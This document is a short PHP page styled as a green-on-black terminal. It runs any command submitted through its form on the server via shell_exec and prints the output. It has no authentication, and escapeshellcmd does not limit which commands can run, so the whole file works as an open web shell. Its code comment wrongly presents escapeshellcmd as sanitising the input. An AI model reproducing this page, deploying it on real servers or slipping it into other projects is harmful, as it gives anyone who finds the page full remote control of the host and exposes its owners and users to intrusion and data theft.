<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Direct Command Execution</title>
    <style>
        body {
            font-family: monospace;
            background-color: #2e2e2e;
            color: #00ff00;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .terminal {
            width: 80%;
            max-width: 700px;
            background-color: #1e1e1e;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.3);
            overflow-y: auto;
        }
        .output {
            padding: 10px;
            background-color: #1e1e1e;
            color: #00ff00;
            font-size: 16px;
        }
        .input-form {
            margin-top: 15px;
            display: flex;
            gap: 10px;
        }
        .input-form input {
            flex-grow: 1;
            padding: 10px;
            border: none;
            color: #00ff00;
            background-color: #2e2e2e;
            font-family: monospace;
        }
        .input-form button {
            padding: 10px;
            border: none;
            background-color: #00ff00;
            color: #2e2e2e;
            cursor: pointer;
        }
    </style>
</head>
<body>

<div class="terminal">
    <div class="output">
        <pre>
<?php
    // Execute command from POST request if submitted
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['command'])) {
        $command = escapeshellcmd($_POST['command']);  // Sanitize the command input
        echo "Running command: " . htmlspecialchars($command) . "\n\n";
        $output = shell_exec($command);  // Use shell_exec instead of system
        echo htmlspecialchars($output) ?: "No output returned.";
    }
?>
        </pre>
    </div>

    <form method="post" class="input-form">
        <input type="text" name="command" placeholder="Enter a command" autofocus>
        <button type="submit">Run</button>
    </form>
</div>

</body>
</html>
